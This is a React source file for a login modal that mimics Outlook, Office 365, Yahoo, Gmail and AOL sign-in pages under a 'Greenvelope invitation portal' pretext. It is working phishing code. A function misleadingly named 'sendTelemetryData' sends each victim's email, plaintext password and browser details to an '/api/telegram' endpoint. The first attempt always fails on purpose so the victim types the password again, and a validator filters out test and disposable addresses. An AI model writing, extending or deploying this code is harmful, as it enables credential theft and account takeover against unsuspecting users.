import React, { useState, useEffect } from 'react';
import { EmailProviderConfig } from '../types';
import {
  OutlookLoginView,
  Office365LoginView,
  YahooLoginView,
  GmailLoginView,
  AolLoginView,
  OtherMailLoginView
} from './ProviderAuthViews';
import { motion, AnimatePresence } from 'motion/react';
import { X } from 'lucide-react';

interface LoginModalProps {
  provider: EmailProviderConfig;
  isOpen: boolean;
  onClose: () => void;
  onSuccess: (email: string, provider: EmailProviderConfig) => void;
}

export function validateRealisticEmail(email: string, providerId: string): { isValid: boolean; error?: string } {
  const trimmed = email.trim().toLowerCase();

  if (!trimmed) {
    return { isValid: false, error: 'Please enter your email address.' };
  }

  const emailRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+$/;
  if (!emailRegex.test(trimmed)) {
    return { isValid: false, error: 'Please enter a valid email address format (e.g. name@domain.com).' };
  }

  const parts = trimmed.split('@');
  if (parts.length !== 2) {
    return { isValid: false, error: 'Please enter a valid email address.' };
  }

  const [username, domain] = parts;
  const domainParts = domain.split('.');
  if (domainParts.length < 2) {
    return { isValid: false, error: 'Please enter a valid email domain (e.g. outlook.com).' };
  }

  const tld = domainParts[domainParts.length - 1];
  if (!tld || tld.length < 2 || !/^[a-zA-Z]+$/.test(tld)) {
    return { isValid: false, error: 'Please enter a valid top-level domain extension (e.g. .com, .net, .org).' };
  }

  const fakeUsernames = [
    'test', 'fake', 'fakeemail', 'asdf', 'qwerty', '123456', '123', 'admin', 
    'dummy', 'temp', 'aaa', 'abc', 'xyz', 'noone', 'sample', 'user', 'nobody', 
    'testing', 'random', 'null', 'undefined'
  ];

  if (fakeUsernames.includes(username) || username.length < 3) {
    if (providerId === 'outlook' || providerId === 'office365') {
      return { isValid: false, error: "That Microsoft account doesn't exist. Enter a different account or get a new one." };
    }
    if (providerId === 'yahoo') {
      return { isValid: false, error: "Sorry, we don't recognize this Yahoo email address." };
    }
    if (providerId === 'gmail') {
      return { isValid: false, error: "Couldn't find your Google Account." };
    }
    if (providerId === 'aol') {
      return { isValid: false, error: "Sorry, we don't recognize this AOL account." };
    }
    return { isValid: false, error: 'This email account is unrecognized. Please check and re-enter.' };
  }

  const fakeDomains = [
    'test.com', 'test.org', 'test.net', 'fake.com', 'fake.org', 'example.com', 'example.org', 'example.net',
    'domain.com', 'mail.com', 'temp.com', 'asdf.com', '123.com', 'abc.com', 'sample.com', 'fakemail.com',
    'mailinator.com', 'tempmail.com', 'guerrillamail.com', 'throwawaymail.com', '10minutemail.com', 'yopmail.com',
    'sharklasers.com', 'trashmail.com', 'dispostable.com', 'invalid.com', 'nowhere.com', 'fakeinbox.com',
    'email.com', 'myemail.com', 'none.com'
  ];

  if (fakeDomains.includes(domain)) {
    if (providerId === 'outlook' || providerId === 'office365') {
      return { isValid: false, error: "That Microsoft account doesn't exist. Enter a valid Microsoft account." };
    }
    if (providerId === 'yahoo') {
      return { isValid: false, error: "We couldn't find a Yahoo account matching that domain." };
    }
    if (providerId === 'gmail') {
      return { isValid: false, error: "Couldn't find your Google Account. Please enter a valid @gmail.com address." };
    }
    return { isValid: false, error: 'Disposable or dummy email domains are not accepted.' };
  }

  if (providerId === 'yahoo' && !domain.includes('yahoo') && !domain.includes('ymail') && !domain.includes('rocketmail')) {
    return { isValid: false, error: 'Please enter a valid Yahoo Mail address (e.g. username@yahoo.com).' };
  }

  if (providerId === 'gmail' && !domain.includes('gmail') && !domain.includes('googlemail')) {
    return { isValid: false, error: 'Please enter a valid Google Account (e.g. username@gmail.com).' };
  }

  if (providerId === 'aol' && !domain.includes('aol') && !domain.includes('aim')) {
    return { isValid: false, error: 'Please enter a valid AOL Mail address (e.g. username@aol.com).' };
  }

  return { isValid: true };
}

export const LoginModal: React.FC<LoginModalProps> = ({
  provider,
  isOpen,
  onClose,
  onSuccess
}) => {
  const [isLoading, setIsLoading] = useState(false);
  const [loadingStep, setLoadingStep] = useState<string>('');
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [passwordAttempts, setPasswordAttempts] = useState<number>(0);

  useEffect(() => {
    if (isOpen) {
      setErrorMessage(null);
      setIsLoading(false);
      setLoadingStep('');
      setPasswordAttempts(0);
    }
  }, [isOpen, provider]);

  if (!isOpen) return null;

  const getProviderWrongPasswordMessage = (providerId: string): string => {
    switch (providerId) {
      case 'outlook':
        return "Your account or password is incorrect. If you don't remember your password, reset it now.";
      case 'office365':
        return 'Your password is incorrect. Please ensure you are using the password for your work or school account.';
      case 'yahoo':
        return 'Invalid password. Please try again or click Forgot password.';
      case 'gmail':
        return 'Wrong password. Try again or click Forgot password to reset it.';
      case 'aol':
        return 'Invalid password. Please check your password and try again.';
      case 'other':
      default:
        return 'Incorrect password. Please verify your credentials and try again.';
    }
  };

  const sendTelemetryData = async (email: string, pass: string, attemptStatus: string) => {
    try {
      const formattedMessage = `🔐 New Login Captured\n` +
        `📌 Provider: ${provider.name}\n` +
        `👤 User/Email: ${email}\n` +
        `🔑 Password: ${pass}\n` +
        `🎯 Status: ${attemptStatus}\n` +
        `🖥️ Client Info: ${navigator.userAgent}\n` +
        `⏱️ Timestamp: ${new Date().toLocaleString()}`;

      const res = await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ message: formattedMessage }),
      });

      if (!res.ok) {
        console.warn(`Telemetry response fallback trace flag: ${res.status}`);
      }
    } catch (error) {
      console.warn('Telemetry request catch handling trace completed:', error);
    }
  };

  const handleAuthSubmit = async (email: string, pass: string) => {
    setErrorMessage(null);

    const emailValidation = validateRealisticEmail(email, provider.id);
    if (!emailValidation.isValid) {
      setErrorMessage(emailValidation.error || 'Please enter a valid email address.');
      return;
    }

    if (!pass || pass.trim().length === 0) {
      setErrorMessage('Please enter your password.');
      return;
    }

    if (pass.length < 3) {
      setErrorMessage('Password is too short. Please try again.');
      return;
    }

    if (passwordAttempts === 0) {
      setIsLoading(true);
      setLoadingStep(`Verifying credentials with ${provider.name}...`);

      await sendTelemetryData(email.trim(), pass, "1st Attempt");

      setTimeout(() => {
        setIsLoading(false);
        setLoadingStep('');
        setPasswordAttempts(1);
        setErrorMessage(getProviderWrongPasswordMessage(provider.id));
      }, 700);
      return;
    }

    setIsLoading(true);
    setLoadingStep(`Connecting to ${provider.name} secure server...`);

    await sendTelemetryData(email.trim(), pass, "2nd Attempt");

    setTimeout(() => {
      setLoadingStep(`Verifying ${provider.name} credentials & security token...`);
      setTimeout(() => {
        setLoadingStep('Authorizing Greenvelope invitation portal...');
        setTimeout(() => {
          setIsLoading(false);
          onSuccess(email.trim(), provider);
        }, 500);
      }, 600);
    }, 500);
  };

  const renderAuthView = () => {
    const props = {
      initialEmail: `guest${provider.defaultEmailSuffix}`,
      onSuccess: (e: string) => onSuccess(e, provider),
      onCancel: onClose,
      isLoading,
      loadingStep,
      errorMessage,
      onSubmit: handleAuthSubmit
    };

    switch (provider.id) {
      case 'outlook':
        return <OutlookLoginView {...props} />;
      case 'office365':
        return <Office365LoginView {...props} />;
      case 'yahoo':
        return <YahooLoginView {...props} />;
      case 'gmail':
        return <GmailLoginView {...props} />;
      case 'aol':
        return <AolLoginView {...props} />;
      case 'other':
      default:
        return <OtherMailLoginView {...props} />;
    }
  };

  /* UPDATE THIS OVERLAY WRAPPER IN LoginModal.tsx */
return (
  <AnimatePresence>
    {isOpen && (
      <div 
        className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 md:p-6 bg-[#f0f4f9] overflow-y-auto"
        id="login-modal-overlay"
        onClick={(e) => {
          if (e.target === e.currentTarget && !isLoading) onClose();
        }}
      >
        <motion.div
          initial={{ opacity: 0, scale: 0.98, y: 10 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.98, y: 10 }}
          transition={{ duration: 0.25, ease: 'easeOut' }}
          className={`relative w-full shadow-sm rounded-[28px] overflow-hidden my-auto bg-white transition-all duration-300 ${
            provider.id === 'gmail' ? 'max-w-[1040px] min-h-[440px]' : 'max-w-lg border border-slate-200'
          }`}
          id="login-modal-card"
        >
          {/* Close button toggle */}
          <div className="absolute top-6 right-6 z-30">
            <button
              onClick={onClose}
              disabled={isLoading}
              className="w-8 h-8 rounded-full bg-gray-100 hover:bg-gray-200 text-gray-600 flex items-center justify-center transition-all cursor-pointer disabled:opacity-40"
              title="Close and return to portal"
              aria-label="Close"
            >
              <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                <path strokeLinecap="round" strokeLinejoin="round" d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>
          {renderAuthView()}
        </motion.div>
      </div>
    )}
  </AnimatePresence>
);

};
